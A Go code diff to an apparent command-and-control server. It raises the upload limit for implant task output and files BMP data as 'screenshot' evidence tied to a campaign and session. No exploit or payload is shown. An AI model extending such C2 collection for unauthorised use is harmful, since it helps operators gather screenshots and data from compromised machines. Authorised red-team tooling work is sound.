@@ -163,7 +163,7 @@ func (s *C2Server) handlePoll(w http.ResponseWriter, r *http.Request, sessionID 
 }
 
 func (s *C2Server) handleOutput(w http.ResponseWriter, r *http.Request, sessionID string) {
-	body, err := io.ReadAll(io.LimitReader(r.Body, 10*1024*1024))
+	body, err := io.ReadAll(io.LimitReader(r.Body, 32*1024*1024))
 	if err != nil {
 		http.Error(w, "", http.StatusBadRequest)
 		return
@@ -206,8 +206,9 @@ func (s *C2Server) handleOutput(w http.ResponseWriter, r *http.Request, sessionI
 
 func (s *C2Server) storeEvidence(sess *session.Session, taskID string, output []byte) {
 	ctx := context.Background()
-	objectName := fmt.Sprintf("%s/%s.bin", sess.ID, taskID)
-	url, err := storage.UploadBytes(ctx, storage.BucketEvidence, objectName, output, "application/octet-stream")
+	contentType, ext, evidenceType := inferContentType(output)
+	objectName := fmt.Sprintf("%s/%s%s", sess.ID, taskID, ext)
+	url, err := storage.UploadBytes(ctx, storage.BucketEvidence, objectName, output, contentType)
 	if err != nil {
 		s.log.Warn("evidence upload failed", zap.String("task_id", taskID), zap.Error(err))
 		return
@@ -220,12 +221,19 @@ func (s *C2Server) storeEvidence(sess *session.Session, taskID string, output []
 
 	_, err = db.Pool.Exec(ctx, `
 		INSERT INTO evidence (campaign_id, session_id, task_id, type, url, filename)
-		VALUES ($1, $2, $3, 'task_output', $4, $5)`,
-		campaignID, sess.ID, taskID, url, taskID+".bin",
+		VALUES ($1, $2, $3, $4, $5, $6)`,
+		campaignID, sess.ID, taskID, evidenceType, url, taskID+ext,
 	)
 	if err != nil {
 		s.log.Warn("evidence record failed", zap.String("task_id", taskID), zap.Error(err))
 	}
+}
+
+func inferContentType(data []byte) (contentType, ext, evidenceType string) {
+	if len(data) >= 2 && data[0] == 'B' && data[1] == 'M' {
+		return "image/bmp", ".bmp", "screenshot"
+	}
+	return "application/octet-stream", ".bin", "task_output"
 }
 
 func extractIP(r *http.Request) string {
